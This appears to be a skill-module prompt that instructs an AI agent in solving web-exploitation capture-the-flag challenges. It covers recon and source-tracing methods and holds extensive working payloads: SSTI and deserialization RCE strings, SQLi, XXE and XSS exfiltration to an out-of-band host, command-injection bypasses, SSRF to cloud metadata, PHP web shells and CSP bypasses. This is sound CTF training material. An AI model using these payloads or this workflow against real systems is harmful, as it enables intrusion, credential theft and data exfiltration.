# Skill Module: web (web exploitation)

In the first few minutes with supplied source, make a compact path map: attacker-controlled input, route or handler, guard, stateful browser or backend consumer, and possible path to the Flag. Rank two plausible paths by the cheapest test that could disprove each. A challenge title or dependency name is a clue, not evidence that its library internals are the main weakness. Read dependency internals or search for version-specific exploits when the path map makes that the shortest supported test; avoid spending the initial budget there by default.

Start with the supplied goal and a normal control request. When source is available, trace the user-controlled input through the reachable route to the relevant sink; compare neighboring handlers where useful. Do not assume there is exactly one vulnerable handler or that every challenge uses a framework deviation. The recipes below are options, not a sequence to exhaust. base.md owns the solve loop, submission/POISON, belief≠proof, local→remote/PoW, and the `notes/` model.

Test a guard in the context where its response is consumed. If a response depends on a header, method, cookie, or other request property, check whether redirects, caches, and browser history preserve that distinction. Compare request and response headers and use a harmless marker in the same browser context. A fresh navigation that receives a denial only rules out that fresh request; a history traversal or cached response may follow a different path. Do not dismiss all such paths or pivot into deep dependency internals until the relevant sequence has been observed.

For a browser-dependent hypothesis, record the actors, origins, pages, request order, headers, storage state and navigation steps needed for the claimed effect. Reproduce that sequence with a harmless marker before treating a negative result as disproof. A single request or a different browser context is only a control for that context. Use the observed network and console events to decide the next discriminating test; stop after the bounded test if it produces no new evidence. `localhost` can refer to different machines in the bot, target and solver container, so verify the address mapping.

Before asking a remote bot to open an attacker-controlled URL, identify where the bot runs relative to the listener. `localhost` and `127.0.0.1` name the bot's own network namespace, so they reach the solver only if both share that namespace. For a bot on the same container network, bind the listener to `0.0.0.0` and use a reachable solver container address or IP (`hostname -I` is one candidate). For a bot outside that network, use an authorized public callback or same-origin feedback. Send one harmless tagged visit and observe its hit before encoding a secret. If the marker is absent, fix reachability before changing the payload or declaring the browser path disproven. Limit address retries to new evidence.
Run a callback listener as a background job with a job-local log and a readiness check. Use a bounded wait for each bot visit, then inspect the log; do not leave a foreground shell call blocked on a listener while other hypotheses wait. Stop the listener when the experiment ends.

## Evidence budget on a live target
Map the goal, trust boundary, controlled input, and one cheapest falsifying test before probing. The tactics below are candidates, not a checklist to run in full; choose only those supported by a route, response, source line, or browser behavior. Distinguish user and admin-bot contexts, and record which context produced each observation.

Before a broad path search, generated payload sweep, key-guessing run, or concurrent request batch, state the observation that justifies it, the expected result that would confirm or reject the hypothesis, and a bounded cost (requests, candidates, or seconds). Start with the smallest batch that can distinguish alternatives, using local reproduction where possible. If it only produces more of the same negative result, summarize it in `notes/NEXT.md` and change the hypothesis rather than expanding the list. Long work is justified by new verified observations, not by the number of probes made.

Treat a 429, repeated timeout, challenge reset, or temporary hide as a change in target availability. Respect `Retry-After` and contest limits; pause or reduce requests instead of repeating the same probe. If a browser helper fails before navigation because of its own runtime, report the tool failure and use a different observation path; it is not evidence that the payload failed. At the review point described in base.md, compare the shortest remaining path to the Flag against the last verified observation, and stop repeating variants that have no discriminating result.

For a timing or other noisy oracle, first measure a small interleaved set of known-true and known-false controls on the **same** endpoint and session. Record the observed separation, spread, request cost, and a finite request budget before extracting any unknown byte. Use paired or randomized controls to distinguish drift from a real signal. If the measured spread overwhelms the expected signal, or a bounded pilot cannot recover a known control reliably, stop that oracle and test a different path; more repetitions of the same probe are not evidence. A reachable but noisy endpoint is not a missing remote. Request a replacement instance only when the challenge explicitly provides one or a concrete required input is absent. Preserve the pilot data and failed hypothesis in `notes/NEXT.md` so a retry does not restart the same long measurement.

## Source-first when source ships
Map the supplied source quickly. If a target endpoint is supplied, check one normal response against it before expanding the analysis. When there is no endpoint, use a runnable local copy or the supplied code as the observation. Reading every file before the first observation or fuzzing blindly wastes time.
For a multi-service or CI-backed target, use the supplied architecture and operating docs to sketch the shortest path from controlled input to the secret: actors, job identities, persistent mounts/caches, and which component produces or consumes each artifact. Check the trust boundary between components before expanding endpoint fuzzing. For an asynchronous action, preserve its job/session ID and follow trigger → status → result with a finite poll budget based on observed latency and rate limits; a pending job is not a failed payload.
1. **Stack** from manifests: `requirements.txt`/`Pipfile`, `package.json`, `composer.json`, `Gemfile`, `go.mod`, framework imports, pinned versions (record in `notes/ANALYSIS.md` — version decides which gadget/escape works).
2. **Routes → relevant handlers**; identify a reachable path toward the Flag, then follow its input and sink. Expand when an observation points to another path.
3. **Compare nearby behavior when useful**: check how related handlers authorize, query, render, or deserialize. A deviation may be a clue, but the vulnerability need not be a one-line exception.
4. Trace user input → sink (dataflow), not names.

```bash
# routes
grep -rnE "@(app|bp)\.route|app\.(get|post|put|use)|router\.|path\(|Route::|(get|post) '|@(Get|Post)Mapping" .
# dangerous sinks
grep -rnE "eval\(|exec\(|os\.(system|popen)|subprocess|child_process|shell_exec|passthru|proc_open|Runtime|render_template_string|Template\(|ERB|pickle\.|yaml\.(load|unsafe)|unserialize|Marshal\.load|Psych\.load|\.raw\(|\.extra\(|\.execute\(|send_file|sendFile|readfile|include|require_once|createObjectURL|dangerouslySetInnerHTML" .
```
No source? Map the app first: capture one normal request/response per feature, then grep JS bundles for hidden routes (`grep -oE '"/api/[^"]+"'`, `.map` sourcemaps), diff what the UI sends vs. what the API accepts (optional JSON fields unlock paths).

## Deviation table by stack — SAFE idiom → SMELL → probe
### Flask / Python
| Class | Safe | Smell / probe |
|---|---|---|
| SSTI | `render_template("x.html", v=v)` | `render_template_string`, f-string/`%`/`.format` INTO template → Jinja. Probe `{{7*7}}`→49, `{{7*'7'}}`→`7777777` |
| SQLi | ORM / `execute("...=%s",(v,))` | f-string/`%`/`+` into `.execute(f"...{v}")` |
| Deserialize | — | `pickle.loads`, `yaml.load` w/o `SafeLoader` (safe by default only in PyYAML ≥5.1), `jsonpickle` on user data → RCE |
| Cmd | arg-list `subprocess.run([...])` | `os.system`, `shell=True`, `os.popen` w/ input |
| Auth | `@login_required` on every private view | the one view missing it → IDOR |
| `str.format` | — | user string into `"...".format(obj)` → `{0.__class__...}` attr traversal (leak, no engine) |
| Debug/secret | — | `debug=True` (Werkzeug console PIN → RCE, `/console`), hardcoded/weak `SECRET_KEY` → forge cookie w/ `flask-unsign`, `@csrf.exempt` |
| Path | — | `open`/`send_file`/`os.path.join(base,user)` w/ `../` (note: `join('/a',​'/etc/passwd')` == `/etc/passwd`) |

### Django
- **IDOR**: safe = `get_object_or_404(qs.filter(user=request.user))`; smell = fetch by raw pk, no owner filter. Also `@login_required`, `PermissionRequiredMixin`.
- **SQLi**: ORM safe; smell `.raw(...)`, `.extra(...)`, `cursor().execute(f"...")`.
- **XSS**: autoescape on; smell `|safe`, `mark_safe(...)`, `format_html` w/ user data.
- **Secret**: leaked/guessable `SECRET_KEY` → forge signed cookies/tokens; `DEBUG=True` leaks settings+stacktrace; `@csrf_exempt`.

### Node / Express
- **Auth**: route mounted without the `requireAuth` middleware.
- **Injection**: template-literal SQL vs `?`; `child_process.exec(input)` vs `execFile([args])`.
- **Deserialize/eval**: `node-serialize.unserialize` (`_$$ND_FUNC$$_` IIFE payload), `vm.runInThisContext`, `eval`, `Function(input)`.
- **Prototype pollution**: recursive `merge`/`extend`/`_.defaultsDeep`/`Object.assign`/`set(obj,path,v)` from parsed JSON. When source or a response shows an object merge across a trust boundary, probe `{"__proto__":{"polluted":"x"}}` and verify a changed property before pursuing an authz or execution gadget.
- **JWT**: `alg:none` accepted, HS256 weak secret, or `jwt.decode` used instead of `jwt.verify` (no sig check). RS256→HS256 confusion if pubkey known — see recipe.
- **SSRF/path**: `sendFile(req.query.f)`, server `fetch/axios(userUrl)` no allowlist.
- **VM sandbox escape**: `this.constructor.constructor("return process")().mainModule.require('child_process')`.

### PHP
- **Deserialize**: `unserialize($_GET/$_POST)` → POP chain via `__wakeup`/`__destruct`; hunt gadget classes in scope (`phpggc` for known libs).
- **Injection**: concat SQL vs PDO/mysqli `?`; `system`/`exec`/`shell_exec`/`passthru`/backticks/`popen`.
- **Code/file**: `eval`/`assert`("...$in...")/`create_function`/`preg_replace('/e')`; `include`/`require` w/ user path → LFI/RFI (see wrapper recipe).
- **Upload**: weak ext/MIME check → `.php` shell; `.htaccess`/double-ext/`.phtml`/`.phar` tricks.
- **Type juggling**: `==` on hashes (`0e…` magic hashes collide), loose compares — see recipe.

### Ruby / Rails
- **Mass assignment**: missing `permit`/strong params → inject `admin=true`.
- **Deserialize**: `Marshal.load`, `YAML.load`/`Psych.load` on user data.
- **Injection**: interpolated SQL vs `where("x = ?",v)`; `system`, backticks, `%x[]`, `Kernel.open("|cmd")`.
- **SSTI**: `render inline:`, `ERB.new(user).result`; `instance_eval` (break with `');code#`).
- **Secret**: leaked `secret_key_base` → forge/decrypt `_session` (old Rails: Marshal cookie → RCE).

### Go
- **SSTI**: `text/template`/pongo2 with user template → `{{.ReadFile "/flag"}}`, pongo2 `{% include "/flag" %}` + path-traversal template name.
- **SSRF/Host**: `http.Get("http://"+r.Host+"/...")` → Host header controls target.
- **Parser mismatch**: proxy vs `net/http` normalize paths differently → 403 bypass.

### Cross-stack candidates when the observed surface fits
IDOR (increment/swap IDs & UUIDs; try all-zero `00000000-…`/default admin id) · SSRF (`http://127.0.0.1`, `169.254.169.254` metadata, `file://`, `gopher://`) · path traversal (`../../etc/passwd`, `%2e%2e%2f`, double-encode, null byte on legacy) · JWT/session (decode, `alg:none`, crack HS256, tamper) · CORS / open redirect / Host-header if flag is auth/origin-gated · **parser disagreement** (proxy vs app, URL-parser vs fetcher, sanitizer vs browser, serializer vs filter — the classic CTF web bug).

## Recon & OOB
Script requests in `solver.py`, don't drive a GUI proxy.
The image has `curl`, `ffuf`, `sqlmap`, `nmap`, `ctf-browser`, `ctf-browser-act` (Playwright with job-local Chromium by default), Python `httpx` and `flask-unsign`. It does not bundle a web wordlist. Build `tmp/paths.txt`/`tmp/params.txt` from the supplied routes, JavaScript and framework conventions before fuzzing; use a bigger list only when justified. Other named scanners, callback/tunnel clients, Puppeteer and dalfox below are optional, so check availability first.

For a JavaScript-heavy page, use `ctf-browser-act` to click, fill, upload and inspect what the browser actually requested. Steps run in one browser context. A popup becomes the active page; the result lists open pages and their zero-based indices. `{"action":"select_page","index":0}` returns to the original tab; `back` and `forward` follow that tab's history. `--session NAME` reuses cookies and localStorage between calls within this solve job; leave it off for a fresh profile. Separate calls do not preserve open tabs or sessionStorage, so keep dependent tab actions in one step list. The result includes bounded page text, console messages and request method/URL/status (query values are redacted); document and XHR/fetch responses also show selected cache headers when present. Save the final DOM or PNG separately when needed. Files referenced by steps must be in this solve job. When a UI action triggers an opaque JSON API response, add `--capture-api-json` for that run: it records at most eight completed same-origin XHR/fetch JSON bodies of up to 4 KiB each, avoiding a second request that might lose browser state. This is opt-in because response bodies can contain target-provided secrets; keep the output in this job and do not paste it into the write-up without review. Cross-origin, large, and non-JSON bodies are skipped.
```bash
cat > tmp/browser-steps.json <<'JSON'
[
  {"action":"fill","selector":"input[name=username]","value":"guest"},
  {"action":"fill","selector":"input[name=password]","value":"guest"},
  {"action":"click","selector":"button[type=submit]"},
  {"action":"wait_for","selector":"#result"}
]
JSON
ctf-browser-act --session login --steps tmp/browser-steps.json \
  --html tmp/after-login.html --screenshot tmp/after-login.png https://TARGET/login
```
For uploads use `{"action":"upload","selector":"input[type=file]","files":["attachments/sample.bin"]}`; for in-page state use `{"action":"evaluate","expression":"localStorage.getItem('key')"}`. `ctf-browser-act --help` lists output and timeout options. This is a separate headless browser inside the solve job, not the operator's browser.
For a quick probe, pipe a JSON action list into `ctf-browser-act --steps - URL`. Bash process substitution (`--steps <(...)`) is not a job-local file and is unsupported.

When the challenge bot explicitly uses Firefox and the hypothesis depends on Firefox rendering or browser behavior, use `ctf-browser-act --engine firefox --install-missing` for the first local check. This downloads the Playwright Firefox build into this solve job only and leaves the base image unchanged; later calls in the same job use `--engine firefox`. Keep the same `--steps` format. A Chromium result cannot disprove a Firefox-only path. Use a known present and known absent control before probing a secret-dependent selector. Avoid downloading Firefox for ordinary HTTP or Chromium bot challenges.
For a short fixed delay in a step list, use `{"action":"wait","milliseconds":1500}` (or `"ms":1500`). Prefer `wait_for` on a selector when the page exposes a completion signal.
```bash
curl -sSi https://TARGET/ | sed -n '1,25p'           # headers, cookies, server, framework tells
curl -sS https://TARGET/robots.txt https://TARGET/sitemap.xml https://TARGET/.well-known/
printf '%s\n' admin api login static uploads backup > tmp/paths.txt # expand from observed routes
ffuf -u https://TARGET/FUZZ -w tmp/paths.txt -mc 200,301,302,403 -t 4 -rate 5 -maxtime 30
printf '%s\n' id user page file name token > tmp/params.txt # expand from observed client/source
ffuf -u 'https://TARGET/item?FUZZ=1' -w tmp/params.txt -fs 0 -t 4 -rate 5 -maxtime 30
```
Installed: **ffuf** (path/parameter probing), Python **httpx** (HTTP client). Optional extras: feroxbuster, katana, nuclei, the httpx CLI, git-dumper and PayloadsAllTheThings. A Python `httpx` import does not provide the `httpx` CLI. Reusable client:
```python
import httpx
c = httpx.Client(base_url="https://TARGET", timeout=10, follow_redirects=True)
r = c.post("/login", data={"user":"a","password":"a"}); print(r.status_code, dict(r.cookies))
```

### Recon wins — the flag may already be exposed
| Find | Move |
|---|---|
| Exposed `.git`/`.svn`/`.hg` | obtain source with installed `curl`/`git` or optional `git-dumper`, then `git log -p --all -S password`/`-S flag`; inspect reverted commits & stashes |
| Editor backups | `index.php~`, `.php.swp`/`.swo`, `.bak`, `config.php.save`, `.DS_Store` → source/secrets leak |
| Custom headers | `curl -sSI` for `x-flag`/`x-secret`; `server`/`x-powered-by` banner → CVE match (nuclei) |
| Robots/sitemap/bundled JS | hidden routes, admin paths, hardcoded API keys/endpoints, client-side secrets/HMAC keys |
| 404 assets, source maps | `strings favicon.ico \| grep -i flag`; `.map` files reconstruct client source |
| Paywall/hidden overlay | content is in raw HTML — `curl`/view-source bypasses the CSS overlay |

### OOB callback for blind bugs — give the target a URL, poll the hit
No reflection ≠ no bug. If an external callback is needed, use an available listener or optional `interactsh-client`/webhook.site; inject a unique URL and poll. A **DNS** hit proves egress even when HTTP is filtered. `cloudflared` is optional, not installed in the image; check availability before using it to expose a full exploit page.
Before sending a callback URL, verify that the target or bot can actually reach it from its own network. A listener bound to `127.0.0.1` inside the solve container is not reachable from a separate remote host. If you run a local listener, start it in the background, save its PID and log in job-local writable storage, make one short readiness request, and poll the tagged callback with a finite deadline. Never leave a long-running listener in the foreground of a shell tool call; a silent wait consumes the solve budget without testing the payload. Stop the listener when the experiment ends. If no reachable callback route exists, use same-origin feedback or a local reproduction instead of repeatedly waiting on an unreachable URL.
| Blind bug | Injection carrier |
|---|---|
| Blind SSRF | any URL/host field, webhook config, PDF/HTML/image renderer, `url=`/`callback=` param |
| Blind XXE | `<!DOCTYPE r [<!ENTITY x SYSTEM "http://OOB/">]>&x;`; param-entity + external DTD to exfil a file in the hostname/path |
| Blind XSS / admin bot | store a marker where a bot/admin renders it; confirm that bot's origin and account, then test which privileged DOM/API data and output channel are actually reachable (HttpOnly cookies are not readable with `document.cookie`) |

## Confirm the primitive against the live target (before escalating)
Reflect a marker / trigger one observable, then escalate. Cache the working request as a function in `solver.py`.
| Primitive | Cheap confirm |
|---|---|
| SSTI | probe table below; `49`/`7777777` reflects → RCE recipe |
| SQLi | boolean (`' AND 1=1`/`1=2`), `ORDER BY n` error, time `SLEEP(5)`/`pg_sleep(5)` before `UNION` |
| SSRF | point at an OOB listener or `file:///etc/hostname` and read the echo |
| Proto-pollution | probe payload, then read back a property you polluted before weaponizing |
| Deserialize | benign gadget causing an observable (sleep/DNS) before the RCE gadget |
| Path/LFI | `/etc/passwd` or `php://filter` base64 of a known file first |
| XSS/bot | use a unique marker through a channel allowed by the bot's CSP; a received callback confirms execution in that context, while no callback alone does not disprove it |

## Weaponization recipes (primitive → flag)

### SSTI — engine probe → RCE (or `SSTImap` to auto-detect)
| Payload → output | Engine → RCE |
|---|---|
| `{{7*7}}`→`49`, `{{7*'7'}}`→`7777777` | **Jinja2** (Python) |
| `{{7*7}}`→`49`, `{{7*'7'}}`→`49` | **Twig** (PHP): `{{['id']\|map('system')\|join}}` |
| `${7*7}`→`49` | **Mako** `${__import__('os').popen('id').read()}` / **FreeMarker** / **Spring EL** |
| `#{7*7}`→`49` | Ruby / Thymeleaf (`*{}`) |
| `<%= 7*7 %>`→`49` | **ERB** (Ruby) `<%=\`cat /flag\`%>` |

```python
assert "49" in c.post("/greet", data={"name":"{{7*7}}"}).text     # confirm engine first
p = "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}"  # Jinja
print(c.post("/greet", data={"name":p}).text)
```
- **Jinja sandboxed** (`__globals__`/`__subclasses__` blocked): pivot via `|attr`, `request.application.__globals__`, config/namespace gadgets; quote-blocked → `__dict__.update(k=v)` (kwargs need no quotes).
- **FreeMarker**: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- **Distroless / no-shell** (Thymeleaf, Spring): don't spawn `sh` — read the file: `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File('/flag'))}` or `${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/flag'))}`.
- **Go/pongo2**: `{{.ReadFile "/flag"}}`; `{% include "/flag" %}`.

### SQLi — UNION flag pull (after col count confirmed)
```python
q = "0 UNION SELECT 1,flag,3 FROM flags-- -"       # column count from ORDER BY n
print(c.get("/item", params={"id": q}).text)
```
Blind → boolean/time oracle char-by-char, or hand the confirmed injectable param + request template to **`sqlmap`** (`--batch`, `--tamper=` scripts for WAF). WAF/filter bypass: `sELecT`/`selselectect` (nested keyword after single-pass strip), `/**/` comments, hex `0x...` for strings, XML/URL entity encoding, MySQL `@v:=` dual-value. SQLite schema: `UNION SELECT sql,2,3 FROM sqlite_master`.

### NoSQL / GraphQL
- **Mongo**: `{"user":{"$ne":null},"pass":{"$ne":null}}` auth bypass; `$where`/regex blind oracle (break `/re/i` with `a^/)||(<cond>)&&(/a^`); `$regex` char-by-char.
- **GraphQL**: introspection (`{__schema{types{name fields{name}}}}`) to map hidden queries; batching/aliasing to brute; GET requests bypass CORS preflight (useful from an XSS-bot). Interpolated args → SQLi.

### LFI / PHP wrappers → source → RCE
1. **Read source** (find the real bug): `php://filter/convert.base64-encode/resource=index.php` → base64-decode.
2. **Filter chain → RCE** (no writable file): `php_filter_chain_generator.py --chain '<?=system($_GET[0]);?>'` emits a `php://filter/...|...` string that an `include` materializes into live PHP.
3. **LFI → RCE** when chains blocked: log poisoning (`/var/log/apache2/access.log` w/ UA `<?php system($_GET[c]);?>`), PHP session (`/tmp/sess_<PHPSESSID>`), `.htaccess` `auto_prepend_file`, `/proc/self/environ`, `data://text/plain;base64,...`, `phar://` (triggers deser via metadata), `expect://`, null-byte on PHP<5.3.4.
4. **Traversal filter bypass**: `....//`, `..%2f`, `%252e%252e%252f` (double-enc), `{.}{.}/`, `/dev/fd/../environ` when `/proc` blocked, Windows 8.3 `FILEFO~1.EXT`.
5. **Type juggling** (auth/compare bypass): `==` on `0e…` magic hashes collide (`md5('240610708')`=`0e462…`); `strcmp($_GET[a],$s)` with `?a[]=1` returns `NULL`==0 → true; `password[]=x` breaks `password_verify`; JSON `{"pw":0}` == `"0e…"`; send JSON int `0` for a string password check.

### XXE — file read / SSRF / OOB exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/flag">]>
<root>&x;</root>
```
Blocked entities / no reflection → **external DTD**: host `<!ENTITY % f SYSTEM "file:///flag"><!ENTITY % e "<!ENTITY s SYSTEM 'http://OOB/?%f;'>">%e;%s;` and reference it. Carriers: DOCX/XLSX (ZIP+XML — inject in `[Content_Types].xml`), SVG, SAML, any XML/RSS upload. Also `X-Forwarded-For`/header reflected into XML → `</ip><admin>true</admin>` injection.

### Command injection — separators & filter bypass
```bash
; id    | id    `id`    $(id)    %0aid    &&id    a||id
```
Space-blocked → `{cat,/flag}` (brace) or `cat${IFS}/flag`. `cat`/`head` blocked → `sed -n p flag`, `tac flag`, `awk '{print}'`, `nl flag`. Char-limited PHP → backticks `` `$_GET[0]`; `` move payload to URL. Filter only strips `;|&<>` → newline `%0a`. LaTeX PDF gen → `\input{|"cat /flag"}`, `\@@input"/etc/passwd"`.

### JWT & signed-session forgery
Installed: `flask-unsign` (Flask cookies), Python `jwt` for token inspection. `jwt_tool` and `hashcat` are optional; use them only after checking availability and preparing a candidate wordlist.
| Weakness | Forge |
|---|---|
| `alg:none` accepted | header `{"alg":"none"}`, drop signature, set `admin`/`user` claim |
| Weak HS256 secret | If optional `hashcat` and a candidate list are available: `hashcat -m 16500 jwt.txt tmp/words.txt`; verify any recovered key before re-signing |
| RS256→HS256 confusion | server verifies HS256 using the **public key** as the HMAC secret → sign token with the pubkey bytes as key |
| `jku`/`x5u` header | point to a JWKS URL you host (OOB) → server fetches your signing key |
| `kid` injection | SQLi / path traversal in `kid`; `kid`→`../../../dev/null` = empty key → HMAC with `""` |
| unverified sig | `jwt.decode` w/o verify → just edit the payload, keep old signature |
| key exposure | check `/api/getPublicKey`, `.env`, `/debug/config` |

```bash
flask-unsign --unsign --cookie "$COOKIE" --wordlist tmp/words.txt # prepare candidate list first
flask-unsign --sign --cookie "{'user':'admin','admin':True}" --secret 'FOUND'
```

### Deserialization — identify by magic, then gadget
| Stack | Magic / tell | Weaponize |
|---|---|---|
| Java | base64 `rO0AB…` / bytes `AC ED 00 05` | `ysoserial CommonsCollections5 'cmd'`; blind → `URLDNS` to OOB first to confirm the sink |
| Python | `pickle.loads`; cookie starts `gAS…`/`\x80` | class with `__reduce__` → `return (os.system,('cat /flag',))`; `pickletools.dis` to read incoming |
| PHP | `unserialize`; `O:`/`a:` string | POP chain via `__wakeup`/`__destruct`; `phpggc <lib> <gadget> system id` |
| .NET | `TypeNameHandling.All` (Json.NET) / `BinaryFormatter` | `ysoserial.net -g ObjectDataProvider -f Json.Net -c 'cmd'` |
| Ruby | `Marshal.load`; `\x04\x08` | universal Marshal RCE gadget (Ruby ≤3.x) |
| Werkzeug/itsdangerous | signed `session` cookie | once `SECRET_KEY` leaks → `flask-unsign --sign`; re-sign `SecureCookie` |

### File upload → RCE / read
Bypass ext/MIME: double-ext `shell.png.php`, `.phtml`/`.phar`, `.htaccess` (`AddType application/x-httpd-php .lol`), null-byte, MIME spoof + magic bytes (PNG/PHP polyglot: `<?php` after `IEND`). ZIP upload with `.php` inside → extract to web dir. `disable_functions` on → `scandir('/')`+`file_get_contents('/flag')`. Python arbitrary write → drop `.so`/overwrite `.pyc` for import RCE. Symlink-in-zip (ZipSlip) → read/write outside dir.

### Race / TOCTOU
For double-spend, one-time token, or check-then-use behavior, confirm the state transition locally or with a small number of remote requests first. Increase concurrency only when the observed race window and contest rules justify it. Bound the total requests and stop on 429 or service degradation; use a local harness for high-volume timing experiments. A race is a hypothesis until a controlled replay shows the expected state change.

### SSRF bypass ladder (allowlist / regex defeats)
| Rung | Payload |
|---|---|
| Unescaped `.` in regex | filter `allowed\.com` also matches `allowedXcom.attacker.com` |
| Credential/`@` confusion | `http://allowed@127.0.0.1/`, `http://127.0.0.1@allowed/`, `http://x@allowed@127.0.0.1/` (parser vs curl disagree) |
| Alt IP encodings | `http://0x7f000001/`, `http://2130706433/`, `http://127.1/`, `http://[::1]/`, `http://[::ffff:127.0.0.1]/`, `127.0.0.1.nip.io` |
| Redirect | your server returns 302→`http://127.0.0.1/` (allowlist checks only the first URL) |
| DNS rebinding | TOCTOU between validation and fetch (rebinder.html) |
| Scheme pivot | `gopher://127.0.0.1:6379/_<raw redis>`, `gopher://…/mysql`, `file:///flag`, `dict://`, `http://127.0.0.1:2375/` (Docker API → `/exec` RCE) |
| Cloud metadata | AWS `http://169.254.169.254/latest/meta-data/iam/security-credentials/`; GCP `http://metadata.google.internal/…` (`Metadata-Flavor: Google`) |

### Access-control / 403 bypass
- **Path confusion** (proxy vs app normalize differently): `%2f`/`%2e%2e`, `/admin/..;/`, trailing `/`, `..;/`, `.json`/`.css` suffix, case, double slash.
- **Header spoof**: `Host: 127.0.0.1`, `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`, `X-Forwarded-Host`, `X-Rewrite-URL`.
- **Method swap**: try `TRACE`/`PUT`/`PATCH`/`HEAD`/arbitrary verb on a `403`d route.
- **Source grep**: the one endpoint missing `@login_required`/`requireAuth`; all-zero/nil UUIDs or default admin id; predictable/sequential IDOR keys; a `/admin/login` that seeds a reusable admin cookie.

## Client-side (XSS, admin bot, CSP) — verify the bot's context
**Bot model**: a report endpoint may launch a privileged browser, but its account, origin, cookies, navigation, browser engine, and secret location vary. Observe that flow before choosing a payload. First confirm execution and readable data in that exact context; then choose an allowed output channel. If the report endpoint accepts a URL you control, or a stored-XSS path exists, test the smallest observable marker there. Solve any report-endpoint PoW. Reproduce the bot locally with its actual engine when that engine is available; otherwise record the mismatch and treat a negative local browser test as inconclusive. The solve container may be read-only: check available browsers before trying to install another one, and do not spend the solve budget repeatedly installing packages that the worker cannot persist. Fuzz reflected/DOM sinks with `dalfox` only when evidence supports it.

### Get JS to run
| Vector | Payload |
|---|---|
| Reflected/stored HTML sink | `<img src=x onerror=P>`, `<svg onload=P>`, `<script>P</script>`, `<body onload=P>` |
| `new URL()` validates syntax not scheme | URL parsing alone does not establish script execution. Test the actual navigation sink and browser policy: `javascript:` may be blocked by CSP, `data:` has an opaque origin, and `blob:` normally uses its creator origin. |
| jQuery `$(location.hash)`/`$(userinput)` | `#<img src=x onerror=P>` (iframe `onload` to trigger `hashchange`) |
| Content-Type from extension | upload/route `note.html` served `text/html` → HTML executes |
| DOM clobbering (no JS filter) | `<form id=config><input name=isAdmin value=1>` clobbers `window.config.isAdmin` |
| Client-side path traversal (CSPT) | frontend `fetch("/log/"+id)` → `id=../admin/addAdmin` |

Filter bypass: case-mix `<ScRiPt>`, `<svg/onload=>`, template literal ``alert`1` ``, HTML entities `&#40;`, hex `\x3c`, **Unicode case-fold** `<ſcript>` (U+017F→s; also `ı`→i, `K`U+212A→k) when regex is ASCII but downstream folds, decimal-IP + `document["cookie"]` bracket notation when dots are filtered.

### Exfil channel (pick by CSP)
1. `fetch`/XHR to your host — blocked by `connect-src`/`default-src`.
2. `new Image().src='//OOB/?'+data` / `location=` / `<link rel=prefetch>` / `<meta http-equiv=refresh>` — governed by `img-src`/`prefetch-src`/navigation, so they leak when only `script-src`/`connect-src` is set.
3. **DNS**: an encoded subdomain can carry data only if a uniquely tagged lookup is observed. `img-src`/`default-src` may block an image request before lookup; do not assume DNS bypasses CSP.
4. **Self-upload / same-origin store**: fetch `/admin`, POST result back as a filename/note → read it yourself. Beats all egress filtering.

### CSP bypass ladder
| CSP weakness | Bypass |
|---|---|
| missing `base-uri` + nonced relative `<script src=rel.js>` | inject `<base href=//attacker/>` — nonce still valid, src now yours |
| whitelists a CDN (`cdnjs`, `unpkg`) | test an allowed library only if it can load and the needed behavioral attributes survive filtering |
| whitelists shared cloud (`*.run.app`,`*.cloudfunctions.net`) | host your JS there |
| JSONP/`?callback=` endpoint on an allowed origin | XSSI: `<script src="/x.js?callback=leak">` wraps secret in your fn |
| attacker-controlled MIME on same-origin reflect | `<script src="/reflect?...&type=application/javascript">` (nosniff doesn't override a declared type) |
| `script-src` only, no `object`/`prefetch` limits | scriptless exfil via `<link rel=prefetch>`, `<meta refresh>` |
| inline blocked but bot follows redirects | an external page runs under its own origin and cannot read the target DOM/cookies; use a redirect only when a separate same-origin read or message bridge is demonstrated |

### Scriptless / CSS-only (strict CSP, `style-src` open)
- `@font-face`+`unicode-range` per char → font fetch fires only for present chars (leaks char *set*).
- Custom-font glyph widths + `@container` queries → per-char width oracle (leaks order too).
- `input[value^=a]{background:url(//OOB/a)}` attribute-value exfil.
- When secret-dependent DOM IDs exist and the privileged bot uses Firefox, an allowed inline `style` attribute can reference an element through `-moz-element(#id)` even if `<style>` is forbidden. This is a possible rendering oracle, not a network callback or direct DOM read. First test a known-present and known-absent ID in the same Firefox version with a harmless local value. A local screenshot difference proves rendering only: before guessing unknown IDs, show that an attacker-observable signal separates paired controls through the actual bot path. Measure spread and request cost; stop if the bounded controls are indistinguishable. Do not use a Chromium result to reject this Firefox-only path.

### Read what's already there
- Hidden DOM: `[...document.querySelectorAll('*')].filter(e=>getComputedStyle(e).display=='none'&&e.textContent.trim())`.
- React state (never in HTML): find `__reactFiber$`/`__reactInternalInstance$` key on a node, walk `.return` to `stateNode.memoizedState`.
- Closed shadow DOM: `Element.prototype.attachShadow` Proxy to capture root; `(0,eval)` to escape `with()` scope.
- Client HMAC/signing key hardcoded in JS → deobfuscate, call the leaked `sign()` in console to forge requests.

### Cache state and poisoning
When a cache is observed, compare its key and `Vary` inputs with the origin's authorization and object identity. Record TTL, `ETag`/`Last-Modified`, and what happens after an object is deleted, recreated, or reassigned. A conditional revalidation that returns `304` can cause the cache to reuse a stored body; test whether the validator still identifies the same authorized representation across generations. Separately, an unkeyed header reflected into a cacheable response or a per-user route treated as a static asset can make one user's content visible to another; prove the cache hit and recipient context with a harmless marker before pursuing the secret.
For any suspected cache issue, compare the tested request's full context with the suspected victim request before drawing a conclusion. Check which inputs form the cache key and whether the browser, intermediary and origin agree on the selected representation. Use an explicit browser `goto` step for navigation and a separate wait, since assigning `location` inside `evaluate` can destroy that evaluation context.

### Cross-origin plumbing
Shared parent domain → set `domain=.site.tld` cookie from a sibling subdomain that reflects it → XSS on the target. `postMessage` handler that accepts `null`/empty origin → send from a `data:` or `sandbox`-only iframe. React-controlled inputs ignore `.value=`: use the native setter + dispatch `input`/`change` (for local form driving).

## Version gotchas
- **PyYAML** `yaml.load(x)` is RCE only < 5.1; ≥5.1 needs an explicit unsafe loader.
- **Werkzeug console PIN** algorithm differs pre/post 0.15 and 1.0 (mac, `machine-id`, username); only reachable with `debug=True`.
- **Jinja sandbox** (SandboxedEnvironment) blocks `__globals__`/`__subclasses__` — pivot via `|attr`, `request`, config/namespace gadgets.
